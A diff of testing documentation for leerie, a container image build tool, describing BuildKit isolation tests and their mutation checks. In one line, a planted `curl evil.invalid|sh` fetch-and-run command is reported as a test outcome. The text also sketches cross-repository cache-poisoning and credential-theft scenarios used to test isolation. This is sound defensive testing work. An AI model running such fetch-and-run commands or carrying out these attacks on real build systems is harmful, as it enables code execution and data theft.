@@ -286,15 +286,38 @@ the latter silently resolves to the real `~/.leerie/...` and the test
 asserts nothing.
 
 The local per-repo image surface — `resolve_repo_image_tag`,
-`_leerie_repo_id`, `build_repo_image`, and `ensure_base_in_buildkit_ns`
-(copies the base into the `buildkit` containerd namespace before the
-derived build so `FROM $BASE_IMAGE` resolves locally under Colima's
-namespaced buildkit; `tests/test_build_repo_image.py` pins that the copy
-fires and precedes the build, and the idempotent skip when the base is
-already present) — is tested via bash-harness subprocess tests with
-stubbed `git` and `nerdctl`.
+`_leerie_repo_id`, `build_repo_image`, and `ensure_base_in_worker_ns`
+(copies the base from leerie's containerd namespace into the one BuildKit's
+worker reads, `default` in the harness's `buildctl` stub, before the derived
+build so `FROM $BASE_IMAGE` resolves locally; `tests/test_build_repo_image.py`
+pins that the copy fires and precedes the build, the skip when the copy
+there has the base's id, and the copy again when its id differs) — is
+tested via bash-harness subprocess tests with stubbed `git`, `nerdctl` and
+`buildctl`.
 
-An image is keyed on the bytes leerie's Dockerfile was made from (review
+Leerie's generated Dockerfile is tested only by its own build (DESIGN §6½
+*Language deps*; review round 35, execution R35E-1), in
+`tests/test_build_repo_image.py`: a launch whose generated file, context,
+version and base match the recorded image runs no build at all, and the
+one that builds runs the repository image's two builds and nothing else
+(`test_an_up_to_date_generated_image_runs_no_build`); when the generated
+file's build fails (a stub `nerdctl` that fails a file holding a
+`# copy-input-shas:` line, builtins only), the launch warns, builds the
+file without the language-dep layer, and records that image under the
+generated file's key, so the next launch runs no build and keeps the key
+(`test_a_language_layer_that_does_not_build_falls_back_once`). Both fail
+at the parent tree, where a probe build ran on every launch before the
+rebuild check (3 builds and then 1). Review round 36 (execution X3): the
+fallback's record carries the `apt-only` mark, its warning names the
+`.dockerfile-hash` path to remove and no longer says "for this run", and
+the next two launches each warn that the image is the apt-only fallback;
+an image whose layer built is recorded unmarked and reused without that
+warning (in `test_an_up_to_date_generated_image_runs_no_build`).
+Falsified live (measured 2026-11-03), each restored: the mark not
+written, the reuse warning removed, the mark written for every image, and
+the old wording each fail their case.
+
+An image is keyed on the repository Dockerfile bytes leerie read (review
 round 29, isolation F4): with a committed `.leerie/Dockerfile` linked to a
 file outside the checkout, the reuse block refuses the link before any
 reuse decision even when the stored hash is that file's digest and the image
@@ -326,15 +349,20 @@ the requested tag's label; a tag outside `registry.fly.io/<app>` is refused
 before flyctl runs; `--digest-file` records the digest a registry holds
 under the tag; `--layout-base` refuses a pushed image that is not the
 base's layers plus one with its configuration, and reports no digest for
-it. `tests/test_registry_image.py` drives `scripts/remote/registry_image.py`
+it; `--no-run` builds and pushes a repository's own stage without the
+local build's entrypoint check and smoke run, which start it (2 cases;
+fails with the guard removed), and `--target` is an unknown argument
+(fails with it accepted again). `tests/test_registry_image.py` drives `scripts/remote/registry_image.py`
 against `tests/fake_registry.py` (a loopback registry behind a Bearer token
 challenge): the digest, a registry whose digest disagrees with the body,
 the layout rule and each way to break it, labels left out, a linux/amd64
 pick from an index. `tests/test_fly_per_repo_image.py` and
 `tests/test_ensure_image.py` run the launcher's `ensure_image`: the cache
 records `<tag> <digest>` (and the base digest for a repository image); a
-repository image is pushed under its own tag, built `FROM` the base's
-digest with `--layout-base`; it is rebuilt when cached on another base; a
+repository image is two pushes (DESIGN §6 *One image, two roots*): the
+repository's Dockerfile, byte for byte, on the base's digest under
+`<tag>-repo` with `--no-run` and no target, then leerie's, `FROM` the base's
+digest and that push's digest, under its own tag with `--layout-base`; it is rebuilt when cached on another base; a
 cached tag without a digest is no hit; and the Fly branch hands
 `provision_machine` the digest reference. Falsified: with `build-push.sh`
 before this change, 7 of `test_build_push_modes.py`'s tests fail; with the
@@ -957,7 +985,7 @@ pass `--setting-sources user`, `--disable-slash-commands`,
 `--settings` env, and put `--` before the first message. All 6 fail with
 the wiring removed.
 
-`tests/test_terminal_text.py` (13 test functions, 15 cases; DESIGN §6 *No
+`tests/test_terminal_text.py` (13 test functions, 16 cases; DESIGN §6 *No
 text leerie did not
 write reaches the operator's terminal as a control sequence*; review round
 30 isolation T1), with an OSC 52 sequence, a CSI, a C1 CSI, a bidi
@@ -982,7 +1010,10 @@ pre-push hook printing them. `tests/test_host_finalize_sh.py` (2 more, 38
 functions, 40 cases) drives `host_finalize`: a failed push's hook output
 and a repository's `pr_base_branch` holding U+202E, and an unusable
 rebaser payload, reach stderr escaped. Falsified against the code before
-the fix: all 8 cases fail. Harnesses that run an extracted launcher block
+the fix: all 8 cases fail. Since the repository image is two builds
+(DESIGN §6 *One image, two roots*) the `build_repo_image` case has a third
+value, leerie's build failing after the repository's succeeded (falsified:
+with that build's status check removed it fails). Harnesses that run an extracted launcher block
 now source the real `scripts/remote/_log.sh` (`tests/conftest.py`'s
 `LOG_SH_SOURCE`, before their own `remote_log` stub: `test_build_repo_image`,
 `test_dockerfile_autogen`, `test_dockerfile_bake_from_capture`,
@@ -7335,50 +7366,240 @@ sample's probe never counts for the next.
   view, leerie's hook does not, and no trap complaint reaches the shim.
   Falsified: without the `import warnings` at the shim's top, `os.execvp`
   imported it in the child after it entered the view (two failures).
-- `tests/test_repo_image_dockerfile.py` — the launcher's
-  `_repo_image_dockerfile` and `_check_repo_image`, verbatim: the final
-  stage is `FROM <base>` and one `COPY` to `/opt/leerie-worker-root/`, the
-  repository's last stage is named (or its own name used) across
-  continuations and heredocs, a swallowing file leaves leerie's nonce
-  target its only definition, a `# syntax=` line is never the first, a
-  linked Dockerfile is refused, and an image that is not the base's layers
-  plus one with the base's configuration is removed. The build context and
-  the image key (review round 30 isolation R1, DESIGN §6 *A repository
-  image is the one built from what it reads*; 4 functions, 17 cases): the
-  context is exactly what the instructions read (COPY/ADD sources, ONBUILD's,
-  a RUN bind mount's, `.dockerignore`) and the extracted files are those;
-  the key moves when a read file changes and not when another does; the
-  local key and the Fly tag carry the context digest; each source form
-  (`.`, `$VAR`, a wildcard before or in the last part, JSON form, `..`, an
-  absent file, ONBUILD, a bind mount with and without a source, a cache
-  mount) names its context; a whole-tree COPY keys on the whole tree. The
-  lexing (review round 31, execution 6; 2 functions, 11 cases): the
-  Dockerfile is lexed as BuildKit lexes it — a tab after the instruction
-  word or a flag, an empty, comment or whitespace-only line inside a
-  continuation, a continuation joined with no separator, `# escape=` — and a
-  source through a committed link reads the link and what it names (a
-  directory link, a path through one, a wildcard matching one), while a link
-  leaving the tree, relative or absolute, adds nothing past itself. Against
-  the parser before the fix the 6 lexing cases and the 3 link-following
-  cases fail; the 2 leaving-the-tree cases pass there too (guards). Review
-  round 32 (execution X1, X2; 6 functions, 20 cases): a `<<` that BuildKit
-  does not read as a heredoc — `$((1<<SHIFT))`, `<<<hello`, `'<<x'`,
-  `"a <<x b"`, `a\<<x`, `x<<y`, a JSON-form `RUN` — leaves the last `FROM`
-  the named worker stage (7 cases); a heredoc's delimiter is read as
-  BuildKit reads it — `END-OF`, `'END OF'`, `"E.O.F"`, `E'O'F`, `<<-` with
-  tab-indented terminator, `0<<`, two on one line — with a `FROM` inside
-  each body (7 cases); a heredoc names no context path while a shifted
-  `RUN` leaves the later `COPY` in it; the repository's `escape` and
-  `check` directives come first and `syntax` never does; a comment, a
-  blank line or an unknown key ends the directives (3 cases); a lower-case
-  `from` gets a lower-case `as`. Against the parent the 7 shapes,
-  `END-OF` and `E'O'F`, the directives case and the casing case fail (11);
-  the other 5 delimiter cases, the context case and the 3 end-of-directive
-  cases pass there too (guards). With only the word rule reverted to the
-  old pattern, the 6 non-JSON shapes and the 2 delimiters fail. Opt-in
-  (`LEERIE_TEST_REPO_IMAGE=<base>`): E1's planted `.pth`, in a real build,
-  is in the worker root and never runs in the image root's interpreter, as
-  leerie or root, and the untracked `.env` is not in the image.
+- `tests/test_repo_image_dockerfile.py` (18 functions, 79 cases, 2 of
+  them opt-in) — the repository image's two builds (DESIGN §6 *One image,
+  two roots*), from the launcher's own helpers, verbatim. `_repo_image_wrap` writes leerie's Dockerfile with no
+  repository text, its final stage `FROM <base>` and one `COPY` to
+  `/opt/leerie-worker-root/`; a linked Dockerfile is refused; an image that
+  is not the base's layers plus one with the base's configuration is
+  removed (7 cases). `build_repo_image`, with a builtins-only `nerdctl`,
+  gives the first build the repository's bytes unchanged, no `--target`,
+  the committed context and an OCI-layout destination, and the second only
+  leerie's file with the layout as the `leerie-worker` named context, for
+  each shape review rounds 32 and 33 found the rewrite diverging on (13
+  cases: `$((1<<N))`, `<<<`, `${X//a/b}`, `${X:1:2}` and `${X:?m}` before a
+  heredoc whose body holds a `FROM`, lower-case instructions under
+  `# check=error=true`, a BOM before a directive and before a `FROM`,
+  `` # escape=` ``, a `\x1c` before `<<EOF`, `# syntax=`, an open heredoc,
+  an open continuation); `_repo_layout_digest` takes a layout holding
+  exactly one image and nothing else. The build context and the image key
+  (review round 30 isolation R1, DESIGN §6 *A repository image is the one
+  built from what it reads*): the context is exactly what the instructions
+  read (COPY/ADD sources, ONBUILD's, a RUN bind mount's, `.dockerignore`)
+  and the extracted files are those; the key moves when a read file changes
+  and not when another does; the local key and the Fly tag carry the
+  context digest; each source form (`.`, `$VAR`, a wildcard before or in
+  the last part, JSON form, `..`, an absent file, ONBUILD, a bind mount
+  with and without a source, a cache mount) names its context; a
+  whole-tree COPY keys on the whole tree. The lexing that makes the context
+  (review round 31, execution 6): a tab after the instruction word or a
+  flag, an empty, comment or whitespace-only line inside a continuation, a
+  continuation joined with no separator, `# escape=`; a source through a
+  committed link reads the link and what it names, a link leaving the tree
+  adds nothing past itself. Heredocs (review rounds 32 and 33): a `<<` that
+  BuildKit does not read as one — `$((1<<SHIFT))`, `<<<hello`, `'<<x'`,
+  `"a <<x b"`, `a\<<x`, `x<<y`, a JSON-form `RUN`, a `\x1c` before `<<EOF`
+  (Go's whitespace) — leaves the next `COPY` in the context (8 cases); a
+  heredoc's delimiter is read as BuildKit reads it — `END-OF`, `'END OF'`,
+  `"E.O.F"`, `E'O'F`, `<<-`, `0<<`, two on one line, and a line carrying
+  `${X//a/b}`, `${X/a/b}`, `${X:1:2}`, `${X:?m}` or `${X##*/}` — so a
+  `COPY` in its body names nothing (12 cases); the parser directives
+  (round 32 X2, round 33 F3): `escape` sets the continuation, a comment, a
+  blank line or an unknown key ends the directives, a BOM is dropped once,
+  lower case is read (7 cases). Falsified live against mutations of the
+  final tree, each restored: the repository's bytes written with a header
+  line (13 of 13 bytes cases fail), a `--target` on the first build (14
+  fail across this file and `test_build_repo_image.py`), Python's
+  `isspace` in `shell_words` (the `\x1c` case), no BOM strip (2), the old
+  `${...}` modifier refusals (4), a layout of more than one image accepted
+  (1), a line added to leerie's file (1). Opt-in
+  (`LEERIE_TEST_REPO_IMAGE=<base>`, real `nerdctl build`s through
+  `build_repo_image`): a two-stage repository file, lower case under
+  `# check=error=true` with a decoy `FROM` in a heredoc, passes
+  `_check_repo_image`, and its worker root is the final stage (its file
+  and environment, the first stage's file only as copied, nothing at the
+  image's own root); E1's planted `.pth` is in the worker root and never
+  runs in the image root's interpreter, as leerie or root, and the
+  untracked `.env` is not in the image.
+- `tests/test_buildkit_isolation.py` (26 functions, 53 cases, 12 of them
+  opt-in: 6 real builds, and 6 under bash 3.2): no build consumes what
+  another build left in BuildKit, every
+  build is given leerie's frontend, and a repository image's build
+  directory lives only as long as its launch, which no build outlives
+  (DESIGN §6, *No build consumes what another build left in BuildKit*, *A
+  repository's parser directives are its own build's; its frontend is
+  leerie's*, *A repository image's build directory lives only as long as
+  its launch*; review round 34, isolation R1, R2 and its observation, and
+  execution R34E-1; review round 35, isolation I1, execution R35E-2 and
+  claims R1; review round 36, isolation I2, execution X1 and X2; review
+  round 37, isolation I3 and I4). From the launcher's own text:
+  `_repo_image_prepare` dates every context entry (the root, a file, a
+  committed link itself) at one time in the past year, never the commit's,
+  and differently on each export, with the same key. Every build is given
+  `--no-cache` and `--build-arg BUILDKIT_SYNTAX=` the one pinned frontend
+  (`LEERIE_DOCKERFILE_FRONTEND`, `docker/dockerfile:1@sha256:<64 hex>`):
+  the base build, both of `build_repo_image`'s, the three builds of a
+  generated file whose language-dep layer fails (the layer's, then the
+  apt-only file's two), and `build-push.sh` on the remote builder and on
+  `--local-build` (2). The frontend is pulled into the namespace
+  BuildKit's worker reads before the base build and before a repository
+  build, and `ensure_frontend_in_worker_ns` pulls only when absent and
+  warns on a failed pull (3). `build-push.sh` refuses a caller's `BUILDKIT_SYNTAX` on
+  either builder (2). Derived from the build sites: each of the launcher's
+  3 `nerdctl build` commands names the pin, and each of `build-push.sh`'s
+  2 builds passes `build_arg_flags`, which both builders start with it.
+  Every build is also given `--build-arg BUILDKIT_CACHE_MOUNT_NS=`: derived
+  from the same sites, each launcher site names a variable drawn from
+  `leerie_cache_mount_ns` with its failure handled, and both builders'
+  `build_arg_flags` name it; run, the base build, both of
+  `build_repo_image`'s, the generated file's three and each builder twice
+  are given 10 namespaces, each `leerie-<32 hex>`, no two alike. With no
+  random bytes, `leerie_cache_mount_ns` prints nothing and returns 1, and
+  `build_repo_image` fails before any build. `build-push.sh` refuses
+  `BUILDKIT_CACHE_MOUNT_NS` (`NAME=v`, `--build-arg=NAME=v`, bare, lower
+  case) and a lower- or mixed-case `BUILDKIT_SYNTAX` on either builder
+  (12). The build directory is `b.<launcher pid>.<random>`.
+  `_sweep_stale_builds` removes a dead launcher's entry (a directory, a
+  file, a link, whose target survives) and any entry untouched for a day,
+  and keeps a live launcher's and a fresh one with no PID. The launcher's
+  text after the base build runs the sweep. A real SIGTERM or SIGHUP to
+  the launcher's shell while `build_repo_image`'s first build blocks (a
+  builtins-only `nerdctl`) leaves no build directory, and the shell dies
+  of the signal (2). A SIGTERM to the launcher's PID alone, then the
+  blocked build released to export its layout: nothing writes the build
+  directory again, and the build's process is gone. All three `$STAGE`
+  EXIT traps, as written, remove a live build directory on a TERM.
+  `_build_job` with the launcher's EXIT trap, on a pty (`setsid --ctty`)
+  unless stated, under bash and, with `LEERIE_TEST_BASH32=<path>`, a bash
+  3.2 (12): the terminal's ^C, a SIGTERM and a SIGHUP to the launcher's
+  PID, and ^C with the output piped to `cat` under `tostop`, each kill the
+  launcher by that signal (the piped one reports status 130), end the
+  build's own child and leave no directory, which the released build does
+  not write again; under `tostop`, and with no controlling terminal, the
+  build's output arrives and its status 3 comes back.
+  Opt-in (`LEERIE_TEST_BUILDKIT_ISOLATION=1`): a buildkitd the test starts
+  in the rootless containerd's namespaces, with its own root, socket and
+  containerd namespace, all removed afterwards, including the
+  `<ns>_history` namespace BuildKit writes. On it: the two-branch
+  reproduction through `build_repo_image` (main's worker root holds main's
+  bytes); a cache mount repository A planted reads empty in repository B's
+  build; leerie's base build, after another build ran its step through a
+  proxy, holds no proxy; repository A, whose `# syntax=` names the official
+  frontend behind a wrapper that drops `no-cache`, reads nothing of the
+  private file repository V's build put in a cache mount; two repository
+  builds through `build_repo_image` overlapping on it (attacker A's 40
+  short cache-mount steps running inside victim V's 25 s step, which the
+  steps' own clocks must show) share no mount either way: A's image holds
+  nothing of V's committed file and V's step installs `clean`; and, after
+  the fixture's daemon is pruned and the frontend's image removed,
+  `ensure_frontend_in_worker_ns` and then a second buildkitd on the
+  same namespace with an empty root and its registry behind a closed
+  proxy port build with the pin (an image it does not hold fails there at
+  the proxy). Round 34, falsified live (measured 2026-11-03): its 12
+  default cases failed at its parent tree, and its 3 opt-in cases there
+  too (main held `curl evil.invalid|sh #xyz`, B read `planted-by-A`, the
+  base held the attacker's proxy); 14 mutations of its final tree each
+  failed their cases. Round 35, falsified live (measured 2026-11-03):
+  against the parent tree (plus `scripts/dockerfile-frontend.sh`, so the
+  harnesses load), every case this round added or changed fails except
+  the digest's form and the pull's own unit cases, which the mutations
+  below cover; at the parent the opt-in I1 case's A read V's file, and
+  with the pull removed the offline case failed to resolve the frontend at
+  the closed proxy. Against the final tree, each of 13 mutations failed the
+  cases it targets, each restored: the pin dropped from the first build,
+  the wrap, the base, the remote builder or `--local-build`; the caller
+  refusal removed; the pull dropped before the base build, at the build
+  decision, or from `ensure_frontend_in_buildkit_ns`; `_build_job_end`
+  dropped from `_repo_build_done`; the build run in the foreground; the
+  local run's trap without `_repo_build_done`; and the fallback recorded
+  under its own file's key (in `test_build_repo_image.py`). Round 36,
+  falsified live (measured 2026-11-03), each mutation restored: the
+  namespace dropped from the base build, the wrap, the remote builder or
+  `--local-build`; one value reused for both of `build_repo_image`'s
+  builds; the guard on its first draw removed; the helper's length check
+  removed; the namespace dropped from `build-push.sh`'s refusal, and
+  `nocasematch` dropped from it; each fails the cases it targets.
+  `trap '' TTOU TTIN` dropped from the job fails `tostop` under both
+  shells, and the INT trap dropped fails bash 3.2's `ctrl-c` (exit 129) and
+  `piped-ctrl-c` (status 129). The opt-in overlapping-builds case, run
+  with the namespace dropped from `build_repo_image`'s first build: the
+  steps overlapped and A's image held V's committed file. All 6 opt-in
+  real cases passed on that tree (BuildKit 0.31.2, rootless nerdctl 2.3.5).
+  Round 37 (DESIGN §6 *No build consumes what another build left in
+  BuildKit*, *The image store*; *A repository's build carries no operator
+  credential*). Every harness that runs a repository build defines a
+  builtins-only `buildctl` (`tests/conftest.py`'s `BUILDCTL_STUB`: one
+  containerd worker reading `$STUB_WORKER_NS`, default `default`), so no
+  test asks the host's daemon. Derived from the scripts: every nerdctl
+  command in the launcher and `scripts/dockerfile-frontend.sh` starts with
+  `--namespace`, naming `LEERIE_IMAGE_NS` (16 commands: build, image, kill,
+  run, save) or one of six other spellings, each for its stated reason;
+  the run's two quoted forms and prune's probe name it; `build-push.sh`'s
+  4 nerdctl commands carry `ns_flags`. Run: the real launcher end to end
+  against a stub `nerdctl` inspects and runs in `leerie`; `build_repo_image`
+  refuses with no build when the worker reads `leerie` or `buildctl` does
+  not answer, and builds both on `--buildkit-host` otherwise (4);
+  `leerie_buildkit_resolve` asks in nerdctl's order and takes the first
+  daemon that answers, `$BUILDKIT_HOST` alone when set, and fails on a
+  first daemon with no containerd worker or a label that is no namespace
+  name, or none answering (6); `leerie_sweep_worker_images` removes every
+  `leerie-repo/…` and `docker.io/leerie-repo/…` name and nothing else,
+  never with `-f`, refuses naming one left in use, and refuses when the
+  listing fails (3), and the launcher's build decision calls it before any
+  build (2, in `test_build_repo_image.py`); `_container_ns` finds a run's
+  container in `leerie`, then `default`; both builds see
+  `DOCKER_CONFIG=<build dir>/registry-auth`, mode 700, empty, with the
+  operator's config in the environment. Opt-in, on the fixture's daemon,
+  whose worker reads the test's namespace while a second namespace of the
+  test's stands for `leerie`: a victim repository built by
+  `build_repo_image` under leerie's name for it, and an attacking
+  Dockerfile that names it by `FROM` and by `RUN --mount=type=bind,from=`
+  fails both ways with "pull access denied", while the victim's own
+  `FROM $BASE_IMAGE` built; the control, leerie's images in the worker's
+  namespace and the check overridden, copies the victim's file; with
+  leerie's namespace set to the worker's, `build_repo_image` refuses and
+  runs no build; the sweep on the real namespace removes an unused
+  `leerie-repo/…` name, keeps one a container was created from by digest
+  and refuses naming it, and passes once the container is gone; and a
+  registry on loopback inside RootlessKit's network namespace, holding a
+  private image behind Basic authentication the operator's Docker config
+  holds: the attack through `build_repo_image` fails with 401, while the
+  same Dockerfile built directly with the operator's config reads the
+  file. Falsified live (measured 2026-11-03), each mutation restored, each
+  failing the cases it targets: `--namespace "$LEERIE_IMAGE_NS"` dropped
+  from the wrap build, `_check_repo_image`'s inspect or the run; the
+  equality check removed from `leerie_buildkit_check`, or the check from
+  `build_repo_image`; `leerie_buildkit_resolve` skipping a daemon with no
+  containerd worker; the sweep's second listing dropped, its `rm` forced,
+  or its call dropped from the build decision; `default` dropped from
+  `_container_ns`; `DOCKER_CONFIG` dropped from the first build, or the
+  directory made 0755; the base copy keyed on presence, not id;
+  `build-push.sh`'s `ns_flags` emptied. The opt-in registry case, with
+  `DOCKER_CONFIG` dropped from the first build, read the file. Round 37's
+  execution review (E1-E4): `_build_job` under bash and bash 3.2, on a pty
+  (`setsid --ctty`), given two SIGHUPs or two SIGINTs 0.5 ms apart
+  (busy-waited: sent back to back the kernel merges them), eight times
+  each: the launcher dies of the signal, the build's child is gone and so
+  is the directory (4); ^Z at an interactive `bash -i` whose job the
+  launcher is (a session leader's own group is orphaned and the kernel
+  drops ^Z's stop for it): the launcher and the build's group stop, nothing
+  reaches the terminal after the prompt, and `fg` continues both to the
+  build's status (2); `build-push.sh` with an `od` that fails leaves
+  nothing in `$TMPDIR` on either builder (2); the base build, both of
+  `build_repo_image`'s and `--local-build`'s are each followed by a
+  `buildctl prune` of exactly their own namespace's cache-mount records,
+  on the daemon they ran on; opt-in, a repository build that fills a
+  20 MB cache mount leaves the daemon no more cache-mount records than
+  before. Falsified live (measured 2026-11-03), each restored: the HUP
+  handler as `trap - HUP; kill -HUP $$`, or none, and the INT handler as
+  `trap - INT; kill -INT $$` (bash 5 left the directory; bash 3.2 too for
+  INT); no TSTP trap, and no second wait after a trapped signal (^Z, both
+  shells); the draw after the `mktemp` (the remote builder's file left);
+  the prune dropped from the wrap build; opt-in, the prune dropped from
+  the first build (one record more). The two-signal test was corrected
+  before it discriminated: sent back to back, the two merged into one and
+  passed against both mutations. All 11 opt-in real cases pass on this
+  tree (BuildKit 0.31.2, rootless nerdctl 2.3.5).
 - `tests/test_capture_validation.py` — E2's proof turned around: the schema,
   `_filter_residual_deps`, `_capture_problems`, `_record_capture`,
   `_merge_capture_into_config`, `apply_captured_deps`, the launcher's apt
